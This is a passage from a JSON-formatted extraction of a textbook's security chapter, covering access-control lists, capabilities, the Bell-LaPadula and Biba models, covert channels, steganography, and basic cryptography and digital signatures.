pigfan: RW\r\nmeaning that Debbie and Phil, and all members of the pigfan group have read and\r\nwrite access to the file.\r\nIt sometimes occurs that a user or a group has certain permissions with respect\r\nto a file that the file owner later wishes to revoke. With access-control lists, it is\r\nrelatively straightforward to revoke a previously granted access. All that has to be\n608 SECURITY CHAP. 9\r\ndone is edit the ACL to make the change. However, if the ACL is checked only\r\nwhen a file is opened, most likely the change will take effect only on future calls to\r\nopen. Any file that is already open will continue to have the rights it had when it\r\nwas opened, even if the user is no longer authorized to access the file."
          },
          "9.3.3 Capabilities": {
            "page": 639,
            "content": "9.3.3 Capabilities\r\nThe other way of slicing up the matrix of Fig. 9-5 is by rows. When this meth\u0002od is used, associated with each process is a list of objects that may be accessed,\r\nalong with an indication of which operations are permitted on each, in other words,\r\nits domain. This list is called a capability list (or C-list) and the individual items\r\non it are called capabilities (Dennis and Van Horn, 1966; Fabry, 1974). A set of\r\nthree processes and their capability lists is shown in Fig. 9-8.\r\nA B C\r\nProcess\r\nOwner\r\nF1 F1:R\r\nF2:R\r\nF1:R\r\nF2:RW\r\nF3:RWX\r\nF2:R\r\nF2 F3:RX\r\nF3\r\nUser\r\nspace\r\nKernel\r\nspace\r\nC-list\r\nFigure 9-8. When capabilities are used, each process has a capability list.\r\nEach capability grants the owner certain rights on a certain object. In Fig. 9-8,\r\nthe process owned by user A can read files F1 and F2, for example. Usually, a\r\ncapability consists of a file (or more generally, an object) identifier and a bitmap\r\nfor the various rights. In a UNIX-like system, the file identifier would probably be\r\nthe i-node number. Capability lists are themselves objects and may be pointed to\r\nfrom other capability lists, thus facilitating sharing of subdomains.\r\nIt is fairly obvious that capability lists must be protected from user tampering.\r\nThree methods of protecting them are known. The first way requires a tagged\r\narchitecture, a hardware design in which each memory word has an extra (or tag)\r\nbit that tells whether the word contains a capability or not. The tag bit is not used\r\nby arithmetic, comparison, or similar ordinary instructions, and it can be modified\r\nonly by programs running in kernel mode (i.e., the operating system). Tagged-ar\u0002chitecture machines have been built and can be made to work well (Feustal, 1972).\r\nThe IBM AS/400 is a popular example.\nSEC. 9.3 CONTROLLING ACCESS TO RESOURCES 609\r\nThe second way is to keep the C-list inside the operating system. Capabilities\r\nare then referred to by their position in the capability list. A process might say:\r\n‘‘Read 1 KB from the file pointed to by capability 2.’’ This form of addressing is\r\nsimilar to using file descriptors in UNIX. Hydra (Wulf et al., 1974) worked this\r\nway.\r\nThe third way is to keep the C-list in user space, but manage the capabilities\r\ncryptographically so that users cannot tamper with them. This approach is particu\u0002larly suited to distributed systems and works as follows. When a client process\r\nsends a message to a remote server, for example, a file server, to create an object\r\nfor it, the server creates the object and generates a long random number, the check\r\nfield, to go with it. A slot in the server’s file table is reserved for the object and the\r\ncheck field is stored there along with the addresses of the disk blocks. In UNIX\r\nterms, the check field is stored on the server in the i-node. It is not sent back to the\r\nuser and never put on the network. The server then generates and returns a\r\ncapability to the user of the form shown in Fig. 9-9.\r\nServer Object Rights f(Objects, Rights, Check)\r\nFigure 9-9. A cryptographically protected capability.\r\nThe capability returned to the user contains the server’s identifier, the object\r\nnumber (the index into the server’s tables, essentially, the i-node number), and the\r\nrights, stored as a bitmap. For a newly created object, all the rights bits are turned\r\non, of course, because the owner can do everything. The last field consists of the\r\nconcatenation of the object, rights, and check field run through a cryptographically\r\nsecure one-way function, f. A cryptographically secure one-way function is a func\u0002tion y = f (x) that has the property that given x it is easy to find y, but given y it is\r\ncomputationally infeasible to find x. We will discuss them in detail in Section 9.5.\r\nFor now, it suffices to know that with a good one-way function, even a determined\r\nattacker will not be able to guess the check field, even if he knows all the other\r\nfields in the capability.\r\nWhen the user wishes to access the object, she sends the capability to the ser\u0002ver as part of the request. The server then extracts the object number to index into\r\nits tables to find the object. It then computes f (Object, Rights, Check), taking the\r\nfirst two parameters from the capability itself and the third from its own tables. If\r\nthe result agrees with the fourth field in the capability, the request is honored;\r\notherwise, it is rejected. If a user tries to access someone else’s object, he will not\r\nbe able to fabricate the fourth field correctly since he does not know the check\r\nfield, and the request will be rejected.\r\nA user can ask the server to produce a weaker capability, for example, for read\u0002only access. First the server verifies that the capability is valid. If so, it computes\r\nf (Object, New rights,Check) and generates a new capability putting this value in\n610 SECURITY CHAP. 9\r\nthe fourth field. Note that the original Check value is used because other outstand\u0002ing capabilities depend on it.\r\nThis new capability is sent back to the requesting process. The user can now\r\ngive this to a friend by just sending it in a message. If the friend turns on rights\r\nbits that should be off, the server will detect this when the capability is used since\r\nthe f value will not correspond to the false rights field. Since the friend does not\r\nknow the true check field, he cannot fabricate a capability that corresponds to the\r\nfalse rights bits. This scheme was developed for the Amoeba system (Tanenbaum\r\net al., 1990).\r\nIn addition to the specific object-dependent rights, such as read and execute,\r\ncapabilities (both kernel and cryptographically protected) usually have generic\r\nrights which are applicable to all objects. Examples of generic rights are\r\n1. Copy capability: create a new capability for the same object.\r\n2. Copy object: create a duplicate object with a new capability.\r\n3. Remove capability: delete an entry from the C-list; object unaffected.\r\n4. Destroy object: permanently remove an object and a capability.\r\nA last remark worth making about capability systems is that revoking access to\r\nan object is quite difficult in the kernel-managed version. It is hard for the system\r\nto find all the outstanding capabilities for any object to take them back, since they\r\nmay be stored in C-lists all over the disk. One approach is to have each capability\r\npoint to an indirect object, rather than to the object itself. By having the indirect\r\nobject point to the real object, the system can always break that connection, thus\r\ninvalidating the capabilities. (When a capability to the indirect object is later pres\u0002ented to the system, the user will discover that the indirect object is now pointing\r\nto a null object.)\r\nIn the Amoeba scheme, revocation is easy. All that needs to be done is change\r\nthe check field stored with the object. In one blow, all existing capabilities are\r\ninvalidated. However, neither scheme allows selective rev ocation, that is, taking\r\nback, say, John’s permission, but nobody else’s. This defect is generally recog\u0002nized to be a problem with all capability systems.\r\nAnother general problem is making sure the owner of a valid capability does\r\nnot give a copy to 1000 of his best friends. Having the kernel manage capabilities,\r\nas in Hydra, solves the problem, but this solution does not work well in a distrib\u0002uted system such as Amoeba.\r\nVery briefly summarized, ACLs and capabilities have somewhat complemen\u0002tary properties. Capabilities are very efficient because if a process says ‘‘Open the\r\nfile pointed to by capability 3’’ no checking is needed. With ACLs, a (potentially\r\nlong) search of the ACL may be needed. If groups are not supported, then granting\r\nev eryone read access to a file requires enumerating all users in the ACL. Capabili\u0002ties also allow a process to be encapsulated easily, whereas ACLs do not. On the\nSEC. 9.3 CONTROLLING ACCESS TO RESOURCES 611\r\nother hand, ACLs allow selective rev ocation of rights, which capabilities do not.\r\nFinally, if an object is removed and the capabilities are not or vice versa, problems\r\narise. ACLs do not suffer from this problem.\r\nMost users are familiar with ACLs, because they are common in operating sys\u0002tems like Windows and UNIX. However, capabilities are not that uncommon ei\u0002ther. For instance, the L4 kernel that runs on many smartphones from many manu\u0002facturers (typically alongside or underneath other operating systems like Android),\r\nis capability based. Likewise, the FreeBSD has embraced Capsicum, bringing\r\ncapabilities to a popular member of the UNIX family."
          }
        }
      },
      "9.4 FORMAL MODELS OF SECURE SYSTEMS": {
        "page": 642,
        "children": {
          "9.4.1 Multilevel Security": {
            "page": 643,
            "content": "9.4.1 Multilevel Security\r\nMost operating systems allow individual users to determine who may read and\r\nwrite their files and other objects. This policy is called discretionary access con\u0002trol. In many environments this model works fine, but there are other environ\u0002ments where much tighter security is required, such as the military, corporate pa\u0002tent departments, and hospitals. In the latter environments, the organization has\r\nstated rules about who can see what, and these may not be modified by individual\r\nsoldiers, lawyers, or doctors, at least not without getting special permission from\r\nthe boss (and probably from the boss’ lawyers as well). These environments need\r\nmandatory access controls to ensure that the stated security policies are enforced\r\nby the system, in addition to the standard discretionary access controls. What these\r\nmandatory access controls do is regulate the flow of information, to make sure that\r\nit does not leak out in a way it is not supposed to.\nSEC. 9.4 FORMAL MODELS OF SECURE SYSTEMS 613\r\nThe Bell-LaPadula Model\r\nThe most widely used multilevel security model is the Bell-LaPadula model\r\nso we will start there (Bell and LaPadula, 1973). This model was designed for\r\nhandling military security, but it is also applicable to other organizations. In the\r\nmilitary world, documents (objects) can have a security level, such as unclassified,\r\nconfidential, secret, and top secret. People are also assigned these levels, depend\u0002ing on which documents they are allowed to see. A general might be allowed to\r\nsee all documents, whereas a lieutenant might be restricted to documents cleared as\r\nconfidential and lower. A process running on behalf of a user acquires the user’s\r\nsecurity level. Since there are multiple security levels, this scheme is called a mul\u0002tilevel security system.\r\nThe Bell-LaPadula model has rules about how information can flow:\r\n1. The simple security property: A process running at security level k\r\ncan read only objects at its level or lower. For example, a general can\r\nread a lieutenant’s documents but a lieutenant cannot read a general’s\r\ndocuments.\r\n2. The * property: A process running at security level k can write only\r\nobjects at its level or higher. For example, a lieutenant can append a\r\nmessage to a general’s mailbox telling everything he knows, but a\r\ngeneral cannot append a message to a lieutenant’s mailbox telling\r\nev erything he knows because the general may have seen top-secret\r\ndocuments that may not be disclosed to a lieutenant.\r\nRoughly summarized, processes can read down and write up, but not the reverse.\r\nIf the system rigorously enforces these two properties, it can be shown that no\r\ninformation can leak out from a higher security level to a lower one. The * proper\u0002ty was so named because in the original report, the authors could not think of a\r\ngood name for it and used * as a temporary placeholder until they could devise a\r\nbetter name. They nev er did and the report was printed with the *. In this model,\r\nprocesses read and write objects, but do not communicate with each other directly.\r\nThe Bell-LaPadula model is illustrated graphically in Fig. 9-11.\r\nIn this figure a (solid) arrow from an object to a process indicates that the proc\u0002ess is reading the object, that is, information is flowing from the object to the proc\u0002ess. Similarly, a (dashed) arrow from a process to an object indicates that the proc\u0002ess is writing into the object, that is, information is flowing from the process to the\r\nobject. Thus all information flows in the direction of the arrows. For example,\r\nprocess B can read from object 1 but not from object 3.\r\nThe simple security property says that all solid (read) arrows go sideways or\r\nupward. The * property says that all dashed (write) arrows also go sideways or\r\nupward. Since information flows only horizontally or upward, any information that\r\nstarts out at level k can never appear at a lower level. In other words, there is never\n614 SECURITY CHAP. 9\r\n5\r\n2\r\n6\r\n3 4\r\n1\r\nD\r\nE\r\nC\r\nA\r\nB\r\n4\r\n3\r\n2\r\n1\r\nSecurity level\r\nLegend\r\nProcess Object\r\nRead\r\nWrite\r\nFigure 9-11. The Bell-LaPadula multilevel security model.\r\na path that moves information downward, thus guaranteeing the security of the\r\nmodel.\r\nThe Bell-LaPadula model refers to organizational structure, but ultimately has\r\nto be enforced by the operating system. One way this could be done is by assign\u0002ing each user a security level, to be stored along with other user-specific data such\r\nas the UID and GID. Upon login, the user’s shell would acquire the user’s security\r\nlevel and this would be inherited by all its children. If a process running at security\r\nlevel k attempted to open a file or other object whose security level is greater than\r\nk, the operating system should reject the open attempt. Similarly attempts to open\r\nany object of security level less than k for writing must fail.\r\nThe Biba Model\r\nTo summarize the Bell-LaPadula model in military terms, a lieutenant can ask\r\na private to reveal all he knows and then copy this information into a general’s file\r\nwithout violating security. Now let us put the same model in civilian terms. Imag\u0002ine a company in which janitors have security level 1, programmers have security\r\nlevel 3, and the president of the company has security level 5. Using Bell\u0002LaPadula, a programmer can query a janitor about the company’s future plans and\r\nthen overwrite the president’s files that contain corporate strategy. Not all com\u0002panies might be equally enthusiastic about this model.\r\nThe problem with the Bell-LaPadula model is that it was devised to keep\r\nsecrets, not guarantee the integrity of the data. For the latter, we need precisely the\r\nreverse properties (Biba, 1977):\nSEC. 9.4 FORMAL MODELS OF SECURE SYSTEMS 615\r\n1. The simple integrity property: A process running at security level k\r\ncan write only objects at its level or lower (no write up).\r\n2. The integrity * property: A process running at security level k can\r\nread only objects at its level or higher (no read down).\r\nTogether, these properties ensure that the programmer can update the janitor’s files\r\nwith information acquired from the president, but not vice versa. Of course, some\r\norganizations want both the Bell-LaPadula properties and the Biba properties, but\r\nthese are in direct conflict so they are hard to achieve simultaneously."
          },
          "9.4.2 Covert Channels": {
            "page": 646,
            "content": "9.4.2 Covert Channels\r\nAll these ideas about formal models and provably secure systems sound great,\r\nbut do they actually work? In a word: No. Even in a system which has a proper\r\nsecurity model underlying it and which has been proven to be secure and is cor\u0002rectly implemented, security leaks can still occur. In this section we discuss how\r\ninformation can still leak out even when it has been rigorously proven that such\r\nleakage is mathematically impossible. These ideas are due to Lampson (1973).\r\nLampson’s model was originally formulated in terms of a single timesharing\r\nsystem, but the same ideas can be adapted to LANs and other multiuser environ\u0002ments, including applications running in the cloud. In the purest form, it involves\r\nthree processes on some protected machine. The first process, the client, wants\r\nsome work performed by the second one, the server. The client and the server do\r\nnot entirely trust each other. For example, the server’s job is to help clients with\r\nfilling out their tax forms. The clients are worried that the server will secretly\r\nrecord their financial data, for example, maintaining a secret list of who earns how\r\nmuch, and then selling the list. The server is worried that the clients will try to steal\r\nthe valuable tax program.\r\nThe third process is the collaborator, which is conspiring with the server to\r\nindeed steal the client’s confidential data. The collaborator and server are typically\r\nowned by the same person. These three processes are shown in Fig. 9-12. The ob\u0002ject of this exercise is to design a system in which it is impossible for the server\r\nprocess to leak to the collaborator process the information that it has legitimately\r\nreceived from the client process. Lampson called this the confinement problem.\r\nFrom the system designer’s point of view, the goal is to encapsulate or confine\r\nthe server in such a way that it cannot pass information to the collaborator. Using a\r\nprotection-matrix scheme we can easily guarantee that the server cannot communi\u0002cate with the collaborator by writing a file to which the collaborator has read ac\u0002cess. We can probably also ensure that the server cannot communicate with the\r\ncollaborator using the system’s interprocess communication mechanism.\r\nUnfortunately, more subtle communication channels may also be available. For\r\nexample, the server can try to communicate a binary bit stream as follows. To send\n616 SECURITY CHAP. 9\r\n(a) (b)\r\nClient Server Collaborator\r\nKernel Kernel\r\nEncapsulated server\r\nCovert\r\nchannel\r\nFigure 9-12. (a) The client, server, and collaborator processes. (b) The encapsu\u0002lated server can still leak to the collaborator via covert channels.\r\na 1 bit, it computes as hard as it can for a fixed interval of time. To send a 0 bit, it\r\ngoes to sleep for the same length of time.\r\nThe collaborator can try to detect the bit stream by carefully monitoring its re\u0002sponse time. In general, it will get better response when the server is sending a 0\r\nthan when the server is sending a 1. This communication channel is known as a\r\ncovert channel, and is illustrated in Fig. 9-12(b).\r\nOf course, the covert channel is a noisy channel, containing a lot of extraneous\r\ninformation, but information can be reliably sent over a noisy channel by using an\r\nerror-correcting code (e.g., a Hamming code, or even something more sophisti\u0002cated). The use of an error-correcting code reduces the already low bandwidth of\r\nthe covert channel even more, but it still may be enough to leak substantial infor\u0002mation. It is fairly obvious that no protection model based on a matrix of objects\r\nand domains is going to prevent this kind of leakage.\r\nModulating the CPU usage is not the only covert channel. The paging rate can\r\nalso be modulated (many page faults for a 1, no page faults for a 0). In fact, almost\r\nany way of degrading system performance in a clocked way is a candidate. If the\r\nsystem provides a way of locking files, then the server can lock some file to indi\u0002cate a 1, and unlock it to indicate a 0. On some systems, it may be possible for a\r\nprocess to detect the status of a lock even on a file that it cannot access. This covert\r\nchannel is illustrated in Fig. 9-13, with the file locked or unlocked for some fixed\r\ntime interval known to both the server and collaborator. In this example, the secret\r\nbit stream 11010100 is being transmitted.\r\nLocking and unlocking a prearranged file, S, is not an especially noisy channel,\r\nbut it does require fairly accurate timing unless the bit rate is very low. The\r\nreliability and performance can be increased even more using an acknowledgement\r\nprotocol. This protocol uses two more files, F1 and F2, locked by the server and\r\ncollaborator, respectively, to keep the two processes synchronized. After the server\r\nlocks or unlocks S, it flips the lock status of F1 to indicate that a bit has been sent.\r\nAs soon as the collaborator has read out the bit, it flips F2’s lock status to tell the\r\nserver it is ready for another bit and waits until F1 is flipped again to indicate that\nSEC. 9.4 FORMAL MODELS OF SECURE SYSTEMS 617\r\n1 1 0 1 0 1 0 0\r\nServer\r\nServer locks\r\nfile to send 1\r\nTime\r\nCollaborator\r\nServer unlocks\r\nfile to send 0\r\nBit stream sent\r\nFigure 9-13. A covert channel using file locking.\r\nanother bit is present in S. Since timing is no longer involved, this protocol is fully\r\nreliable, even in a busy system, and can proceed as fast as the two processes can\r\nget scheduled. To get higher bandwidth, why not use two files per bit time, or\r\nmake it a byte-wide channel with eight signaling files, S0 through S7?\r\nAcquiring and releasing dedicated resources (tape drives, plotters, etc.) can\r\nalso be used for signaling. The server acquires the resource to send a 1 and releases\r\nit to send a 0. In UNIX, the server could create a file to indicate a 1 and remove it\r\nto indicate a 0; the collaborator could use the access system call to see if the file\r\nexists. This call works even though the collaborator has no permission to use the\r\nfile. Unfortunately, many other covert channels exist.\r\nLampson also mentioned a way of leaking information to the (human) owner\r\nof the server process. Presumably the server process will be entitled to tell its\r\nowner how much work it did on behalf of the client, so the client can be billed. If\r\nthe actual computing bill is, say, $100 and the client’s income is $53,000, the ser\u0002ver could report the bill as $100.53 to its owner.\r\nJust finding all the covert channels, let alone blocking them, is nearly hopeless.\r\nIn practice, there is little that can be done. Introducing a process that causes page\r\nfaults at random or otherwise spends its time degrading system performance in\r\norder to reduce the bandwidth of the covert channels is not an attractive idea.\r\nSteganography\r\nA slightly different kind of covert channel can be used to pass secret infor\u0002mation between processes, even though a human or automated censor gets to\r\ninspect all messages between the processes and veto the suspicious ones. For ex\u0002ample, consider a company that manually checks all outgoing email sent by com\u0002pany employees to make sure they are not leaking secrets to accomplices or com\u0002petitors outside the company. Is there a way for an employee to smuggle substan\u0002tial volumes of confidential information right out under the censor’s nose? It turns\r\nout there is and it is not all that hard to do.\n618 SECURITY CHAP. 9\r\nAs a case in point, consider Fig. 9-14(a). This photograph, taken by the author\r\nin Kenya, contains three zebras contemplating an acacia tree. Fig. 9-14(b) appears\r\nto be the same three zebras and acacia tree, but it has an extra added attraction. It\r\ncontains the complete, unabridged text of fiv e of Shakespeare’s plays embedded in\r\nit: Hamlet, King Lear, Macbeth, The Merchant of Venice, and Julius Caesar. To\u0002gether, these plays total over 700 KB of text.\r\n(a) (b)\r\nFigure 9-14. (a) Three zebras and a tree. (b) Three zebras, a tree, and the com\u0002plete text of fiv e plays by William Shakespeare.\r\nHow does this covert channel work? The original color image is 1024 × 768\r\npixels. Each pixel consists of three 8-bit numbers, one each for the red, green, and\r\nblue intensity of that pixel. The pixel’s color is formed by the linear superposition\r\nof the three colors. The encoding method uses the low-order bit of each RGB\r\ncolor value as a covert channel. Thus each pixel has room for 3 bits of secret infor\u0002mation, one in the red value, one in the green value, and one in the blue value.\r\nWith an image of this size, up to 1024 × 768 × 3 bits (294,912 bytes) of secret\r\ninformation can be stored in it.\r\nThe full text of the fiv e plays and a short notice adds up to 734,891 bytes. This\r\nwas first compressed to about 274 KB using a standard compression algorithm.\r\nThe compressed output was then encrypted and inserted into the low-order bits of\r\neach color value. As can be seen (or actually, cannot be seen), the existence of the\r\ninformation is completely invisible. It is equally invisible in the large, full-color\r\nversion of the photo. The eye cannot easily distinguish 7-bit color from 8-bit color.\r\nOnce the image file has gotten past the censor, the receiver just strips off all the\r\nlow-order bits, applies the decryption and decompression algorithms, and recovers\r\nthe original 734,891 bytes. Hiding the existence of information like this is called\r\nsteganography (from the Greek words for ‘‘covered writing’’). Steganography is\r\nnot popular in dictatorships that try to restrict communication among their citizens,\r\nbut it is popular with people who believe strongly in free speech.\nSEC. 9.4 FORMAL MODELS OF SECURE SYSTEMS 619\r\nViewing the two images in black and white with low resolution does not do\r\njustice to how powerful the technique is. To get a better feel for how steganogra\u0002phy works, one of the authors (AST) has prepared a demonstration for Windows\r\nsystems, including the full-color image of Fig. 9-14(b) with the fiv e plays embed\u0002ded in it. The demonstration can be found at the URL www.cs.vu.nl/~ast/ . Click\r\non the covered writing link there under the heading STEGANOGRAPHY DEMO.\r\nThen follow the instructions on that page to download the image and the steganog\u0002raphy tools needed to extract the plays. It is hard to believe this, but give it a try:\r\nseeing is believing.\r\nAnother use of steganography is to insert hidden watermarks into images used\r\non Web pages to detect their theft and reuse on other Web pages. If your Web page\r\ncontains an image with the secret message ‘‘Copyright 2014, General Images Cor\u0002poration’’ you might have a tough time convincing a judge that you produced the\r\nimage yourself. Music, movies, and other kinds of material can also be watermark\u0002ed in this way.\r\nOf course, the fact that watermarks are used like this encourages some people\r\nto look for ways to remove them. A scheme that stores information in the low\u0002order bits of each pixel can be defeated by rotating the image 1 degree clockwise,\r\nthen converting it to a lossy system such as JPEG, then rotating it back by 1\r\ndegree. Finally, the image can be reconverted to the original encoding system (e.g.,\r\ngif, bmp, tif). The lossy JPEG conversion will mess up the low-order bits and the\r\nrotations involve massive floating-point calculations, which introduce roundoff er\u0002rors, also adding noise to the low-order bits. The people putting in the watermarks\r\nknow this (or should know this), so they put in their copyright information redun\u0002dantly and use schemes besides just using the low-order bits of the pixels. In turn,\r\nthis stimulates the attackers to look for better removal techniques. And so it goes.\r\nSteganography can be used to leak information in a covert way, but it is more\r\ncommon that we want to do the opposite: hide the information from the prying eys\r\nof attackers, without necessarily hiding the fact that we are hiding it. Like Julius\r\nCaesar, we want to ensure that even if our messages or files fall in the wrong\r\nhands, the attacker will not be able to detect the secret information. This is the do\u0002main of cryptography and the topic of the next section."
          }
        }
      },
      "9.5 BASICS OF CRYPTOGRAPHY": {
        "page": 650,
        "children": {
          "9.5.1 Secret-Key Cryptography": {
            "page": 651,
            "content": "9.5.1 Secret-Key Cryptography\r\nTo make this clearer, consider an encryption algorithm in which each letter is\r\nreplaced by a different letter, for example, all As are replaced by Qs, all Bs are re\u0002placed by Ws, all Cs are replaced by Es, and so on like this:\r\nAB CD E F GH I J K LMNO P QR S T UVWX Y Z\r\nQW E RT YU I O PA S D F GH J K L Z XC VB NM\r\nplaintext:\r\nciphertext:\r\nThis general system is called a monoalphabetic substitution, with the key being\r\nthe 26-letter string corresponding to the full alphabet. The encryption key in this\r\nexample is QWERTYUIOPASDFGHJKLZXCVBNM. For the key giv en above, the\nSEC. 9.5 BASICS OF CRYPTOGRAPHY 621\r\nE\r\nKE\r\nEncryption key Decryption key\r\nP P\r\nPlaintext in Plaintext out\r\nEncryption\r\nalgorithm\r\nD\r\nKD\r\nDecryption\r\nalgorithm\r\nCiphertext\r\nC = E(P, KE) P = D(C, KD)\r\nEncryption Decryption\r\nFigure 9-15. Relationship between the plaintext and the ciphertext.\r\nplaintext ATTA CK would be transformed into the ciphertext QZZQEA. The de\u0002cryption key tells how to get back from the ciphertext to the plaintext. In this ex\u0002ample, the decryption key is KXVMCNOPHQRSZYIJADLEGWBUFT because an A\r\nin the ciphertext is a K in the plaintext, a B in the ciphertext is an X in the plaintext,\r\netc.\r\nAt first glance this might appear to be a safe system because although the\r\ncryptanalyst knows the general system (letter-for-letter substitution), he does not\r\nknow which of the 26! ≈ 4 × 1026 possible keys is in use. Nevertheless, given a sur\u0002prisingly small amount of ciphertext, the cipher can be broken easily. The basic at\u0002tack takes advantage of the statistical properties of natural languages. In English,\r\nfor example, e is the most common letter, followed by t, o, a, n, i, etc. The most\r\ncommon two-letter combinations, called digrams, are th, in, er, re, and so on.\r\nUsing this kind of information, breaking the cipher is easy.\r\nMany cryptographic systems, like this one, have the property that given the en\u0002cryption key it is easy to find the decryption key. Such systems are called secret\u0002key cryptography or symmetric-key cryptography. Although monoalphabetic\r\nsubstitution ciphers are completely worthless, other symmetric key algorithms are\r\nknown and are relatively secure if the keys are long enough. For serious security,\r\nminimally 256-bit keys should be used, giving a search space of 2256 ≈ 1. 2 × 1077\r\nkeys. Shorter keys may thwart amateurs, but not major governments."
          },
          "9.5.2 Public-Key Cryptography": {
            "page": 652,
            "content": "9.5.2 Public-Key Cryptography\r\nSecret-key systems are efficient because the amount of computation required\r\nto encrypt or decrypt a message is manageable, but they hav e a big drawback: the\r\nsender and receiver must both be in possession of the shared secret key. They may\r\nev en hav e to get together physically for one to give it to the other. To get around\r\nthis problem, public-key cryptography is used (Diffie and Hellman, 1976). This\n622 SECURITY CHAP. 9\r\nsystem has the property that distinct keys are used for encryption and decryption\r\nand that given a well-chosen encryption key, it is virtually impossible to discover\r\nthe corresponding decryption key. Under these circumstances, the encryption key\r\ncan be made public and only the private decryption key kept secret.\r\nJust to give a feel for public-key cryptography, consider the following two\r\nquestions:\r\nQuestion 1: How much is 314159265358979 × 314159265358979?\r\nQuestion 2: What is the square root of 3912571506419387090594828508241?\r\nMost sixth graders, if given a pencil, paper, and the promise of a really big ice\r\ncream sundae for the correct answer, could answer question 1 in an hour or two.\r\nMost adults given a pencil, paper, and the promise of a lifetime 50% tax cut could\r\nnot solve question 2 at all without using a calculator, computer, or other external\r\nhelp. Although squaring and square rooting are inverse operations, they differ enor\u0002mously in their computational complexity. This kind of asymmetry forms the basis\r\nof public-key cryptography. Encryption makes use of the easy operation but de\u0002cryption without the key requires you to perform the hard operation.\r\nA public-key system called RSA exploits the fact that multiplying really big\r\nnumbers is much easier for a computer to do than factoring really big numbers, es\u0002pecially when all arithmetic is done using modulo arithmetic and all the numbers\r\ninvolved have hundreds of digits (Rivest et al., 1978). This system is widely used\r\nin the cryptographic world. Systems based on discrete logarithms are also used (El\r\nGamal, 1985). The main problem with public-key cryptography is that it is a thou\u0002sand times slower than symmetric cryptography.\r\nThe way public-key cryptography works is that everyone picks a (public key,\r\nprivate key) pair and publishes the public key. The public key is the encryption\r\nkey; the private key is the decryption key. Usually, the key generation is auto\u0002mated, possibly with a user-selected password fed into the algorithm as a seed. To\r\nsend a secret message to a user, a correspondent encrypts the message with the re\u0002ceiver’s public key. Since only the receiver has the private key, only the receiver\r\ncan decrypt the message."
          },
          "9.5.3 One-Way Functions": {
            "page": 653,
            "content": "9.5.3 One-Way Functions\r\nIn various situations that we will see later it is desirable to have some function,\r\nf , which has the property that given f and its parameter x, computing y = f (x) is\r\neasy to do, but given only f (x), finding x is computationally infeasible. Such a\r\nfunction typically mangles the bits in complex ways. It might start out by ini\u0002tializing y to x. Then it could have a loop that iterates as many times as there are 1\r\nbits in x, with each iteration permuting the bits of y in an iteration-dependent way,\r\nadding in a different constant on each iteration, and generally mixing the bits up\r\nvery thoroughly. Such a function is called a cryptographic hash function.\nSEC. 9.5 BASICS OF CRYPTOGRAPHY 623"
          },
          "9.5.4 Digital Signatures": {
            "page": 654,
            "content": "9.5.4 Digital Signatures\r\nFrequently it is necessary to sign a document digitally. For example, suppose a\r\nbank customer instructs the bank to buy some stock for him by sending the bank an\r\nemail message. An hour after the order has been sent and executed, the stock\r\ncrashes. The customer now denies ever having sent the email. The bank can pro\u0002duce the email, of course, but the customer can claim the bank forged it in order to\r\nget a commission. How does a judge know who is telling the truth?\r\nDigital signatures make it possible to sign emails and other digital documents\r\nin such a way that they cannot be repudiated by the sender later. One common way\r\nis to first run the document through a one-way cryptographic hashing algorithm\r\nthat is very hard to invert. The hashing function typically produces a fixed-length\r\nresult independent of the original document size. The most popular hashing func\u0002tions used is SHA-1 (Secure Hash Algorithm), which produces a 20-byte result\r\n(NIST, 1995). Newer versions of SHA-1 are SHA-256 and SHA-512, which pro\u0002duce 32-byte and 64-byte results, respectively, but they are less widely used to\r\ndate.\r\nThe next step assumes the use of public-key cryptography as described above.\r\nThe document owner then applies his private key to the hash to get D(hash). This\r\nvalue, called the signature block, is appended to the document and sent to the re\u0002ceiver, as shown in Fig. 9-16. The application of D to the hash is sometimes\r\nreferred to as decrypting the hash, but it is not really a decryption because the hash\r\nhas not been encrypted. It is just a mathematical transformation on the hash.\r\nOriginal\r\ndocument\r\nOriginal\r\ndocument\r\nDocument\r\ncompressed\r\nto a hash\r\nvalue\r\nHash value\r\nrun through D\r\nD(Hash)\r\nD(Hash) Signature\r\nblock\r\nHash\r\n(a) (b)\r\nFigure 9-16. (a) Computing a signature block. (b) What the receiver gets.\r\nWhen the document and hash arrive, the receiver first computes the hash of the\r\ndocument using SHA-1 or whatever cryptographic hash function has been agreed\r\nupon in advance. The receiver then applies the sender’s public key to the signature\r\nblock to get E(D(hash)). In effect, it ‘‘encrypts’’ the decrypted hash, canceling it\r\nout and getting the hash back. If the computed hash does not match the hash from\r\nthe signature block, the document, the signature block, or both have been tampered\r\nwith (or changed by accident). The value of this scheme is that it applies (slow)\n624 SECURITY CHAP. 9\r\npublic-key cryptography only to a relatively small piece of data, the hash. Note\r\ncarefully that this method works only if for all x\r\nE (D (x)) = x\r\nIt is not guaranteed a priori that all encryption functions will have this property\r\nsince all that we originally asked for was that\r\nD (E (x)) = x\r\nthat is, E is the encryption function and D is the decryption function. To get the\r\nsignature property in addition, the order of application must not matter, that is, D\r\nand E must be commutative functions. Fortunately, the RSA algorithm has this\r\nproperty.\r\nTo use this signature scheme, the receiver must know the sender’s public key.\r\nSome users publish their public key on their Web page. Others do not because they\r\nmay be afraid of an intruder breaking in and secretly altering their key. For them,\r\nan alternative mechanism is needed to distribute public keys. One common meth\u0002od is for message senders to attach a certificate to the message, which contains the\r\nuser’s name and public key and is digitally signed by a trusted third party. Once the\r\nuser has acquired the public key of the trusted third party, he can accept certificates\r\nfrom all senders who use this trusted third party to generate their certificates.\r\nA trusted third party that signs certificates is called a CA (Certification Auth\u0002ority). However, for a user to verify a certificate signed by a CA, the user needs\r\nthe CA’s public key. Where does that come from and how does the user know it is\r\nthe real one? To do this in a general way requires a whole scheme for managing\r\npublic keys, called a PKI (Public Key Infrastructure). For Web browsers, the\r\nproblem is solved in an ad hoc way: all browsers come preloaded with the public\r\nkeys of about 40 popular CAs.\r\nAbove we hav e described how public-key cryptography can be used for digital\r\nsignatures. It is worth mentioning that schemes that do not involve public-key\r\ncryptography also exist."
          },
          "9.5.5 Trusted Platform Modules": {
            "page": 655,
